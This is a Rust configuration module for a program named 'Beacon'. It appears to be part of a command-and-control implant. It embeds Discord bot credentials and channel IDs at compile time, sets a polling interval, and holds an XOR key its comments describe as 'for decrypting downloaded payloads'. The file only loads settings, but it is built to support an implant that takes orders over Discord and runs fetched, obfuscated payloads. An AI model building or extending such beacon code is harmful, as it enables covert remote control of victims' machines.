//! Configuration module for Beacon
//!
//! Handles loading configuration embedded at compile time.

use serde::Deserialize;

use crate::error::{BeaconError, Result};

/// Configuration embedded at compile time
const EMBEDDED_CONFIG: &str = include_str!("../config.toml");

/// Discord-specific configuration
#[derive(Debug, Clone, Deserialize)]
pub struct DiscordConfig {
    /// Discord API base URL (e.g., "https://discord.com/api/v10")
    pub api_url: String,
    /// Bot token from Discord Developer Portal
    pub bot_token: String,
    /// Guild (Server) ID where the beacon operates
    pub guild_id: String,
    /// Channel ID for general notifications
    pub general_channel_id: String,
}

/// General beacon settings
#[derive(Debug, Clone, Deserialize)]
pub struct Settings {
    /// Polling interval in seconds
    pub poll_interval_secs: u64,
}

/// XOR key for decrypting downloaded payloads
#[derive(Debug, Clone, Deserialize)]
pub struct Crypto {
    /// XOR key as hex string (e.g., "deadbeef")
    pub xor_key: String,
}

impl Default for Crypto {
    fn default() -> Self {
        Self {
            xor_key: "41".to_string(), // Default single-byte XOR key
        }
    }
}

/// Root configuration structure
#[derive(Debug, Clone, Deserialize)]
pub struct Config {
    /// Discord-related configuration
    pub discord: DiscordConfig,
    /// General settings
    pub settings: Settings,
    /// Cryptographic settings
    #[serde(default)]
    pub crypto: Crypto,
}

impl Config {
    /// Load configuration embedded at compile time
    ///
    /// The config.toml file is included in the binary during compilation,
    /// so no external file is needed at runtime.
    pub fn load() -> Result<Self> {
        toml::from_str(EMBEDDED_CONFIG).map_err(BeaconError::from)
    }

    /// Get XOR key as bytes
    pub fn get_xor_key(&self) -> Vec<u8> {
        hex_decode(&self.crypto.xor_key).unwrap_or_else(|_| vec![0x41])
    }
}

/// Simple hex decode function
fn hex_decode(s: &str) -> std::result::Result<Vec<u8>, &'static str> {
    if s.len() % 2 != 0 {
        return Err("Invalid hex string length");
    }

    (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).map_err(|_| "Invalid hex character"))
        .collect()
}
